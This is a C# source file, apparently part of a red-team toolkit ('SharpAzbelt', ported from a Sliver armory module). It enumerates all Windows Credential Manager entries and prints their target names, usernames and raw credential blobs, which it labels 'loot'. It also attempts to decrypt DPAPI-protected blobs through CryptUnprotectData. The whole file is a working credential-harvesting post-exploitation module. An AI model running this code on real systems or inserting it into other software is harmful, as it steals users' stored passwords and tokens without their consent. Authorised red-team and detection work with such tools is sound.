/*
 * based on https://github.com/sliverarmory/azbelt/blob/main/src/azbelt/modules/credman.nim
 */
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpAzbelt
{
    class Credman
    {
        public static string runCredman()
        {
            string outText = "[i] Credman:\n";
            int count;
            IntPtr pCredentials = IntPtr.Zero;
            IntPtr[] credentials = null;
            bool retValue = NativeMethods.CredEnumerateW(null, 1, out count, out pCredentials);
            string outFormat = "[+]    {0,-25} : {1}\n";
            string outFormat2 = "[i]    {0,-25} : {1}\n";
            outText += string.Format(outFormat2, "Cred count", count);

            if (!retValue)
            {
                outText += "[-]    Unable to retrieve from Credman\n";
                goto Exit;
            }

            try
            {
                // this helped a lot: https://stackoverflow.com/questions/254980/help-with-credenumerate

                credentials = new IntPtr[count];
                IntPtr p = pCredentials;
                for (int n = 0; n < count; n++)
                {
                    credentials[n] = Marshal.ReadIntPtr(pCredentials, n * Marshal.SizeOf(typeof(IntPtr)));
                }

                // deref credentials into a list
                var creds = new List<NativeMethods.NATIVECREDENTIAL>(credentials.Length);
                foreach (var ptr in credentials)
                {
                    creds.Add((NativeMethods.NATIVECREDENTIAL)Marshal.PtrToStructure(ptr, typeof(NativeMethods.NATIVECREDENTIAL)));
                }

                // enumerate and output the loot
                foreach (NativeMethods.NATIVECREDENTIAL cred in creds)
                {
                    outText += string.Format(outFormat, "Target Name", cred.TargetName);
                    outText += string.Format(outFormat, "Credential Type", cred.Type);
                    outText += string.Format(outFormat, "Persist", cred.Persist);
                    outText += string.Format(outFormat, "Username", cred.UserName);
                    outText += string.Format(outFormat, "Credential Blob Size", cred.CredentialBlobSize);

                    if (cred.CredentialBlobSize > 0)
                    {
                        var credBlob = new byte[cred.CredentialBlobSize];
                        Marshal.Copy(cred.CredentialBlob, credBlob, 0, (int)cred.CredentialBlobSize);
                        string credBlobPrintable = null;

                        // if occurences of \x00 == half of blob size, it's unicode that .NET fails to convert...
                        if (credBlob.Count(x => x == 0) == (cred.CredentialBlobSize/2))
                        {
                            credBlobPrintable = UglyConvert(credBlob, (int)cred.CredentialBlobSize);
                            outText += string.Format(outFormat, "True size", credBlobPrintable.Length);
                        }
                        else
                        {
                            credBlobPrintable = Encoding.Default.GetString(credBlob);
                        }
                        outText += string.Format(outFormat, "Credential Blob", credBlobPrintable);

                        // Now try to unprotect the blob...
                        // https://github.com/sliverarmory/azbelt/blob/main/src/azbelt/utils.nim
                        // https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata
                        if (credBlobPrintable.StartsWith("AQAAA"))
                        {
                            try
                            {
                                byte[] decoded = Convert.FromBase64String(credBlobPrintable);
                                var temp = NativeMethods.cryptUnprotectData(decoded);
                                if (temp.Length > 0)
                                    outText += string.Format(outFormat, "Credential Blob Decrypted", temp);
                            }
                            catch (Exception e)
                            {
                                outText += $"[!]    Failed to decrypt credential blob\n{e}\n";
                            }
                        }
                    }
                    outText += "[.]\n";
                }
            }
            catch (Exception e)
            {
                outText += $"[!]    Failed to enumerate Credman:\n{e}\n";
            }

        Exit:
            return outText + "\n";
        }

        private static string UglyConvert(byte[] input, int length)
        {
            string output = null;
            for (int i = 0; i < length; i += 2)
                output += (char)input[i];
            return output;
        }
    }
}
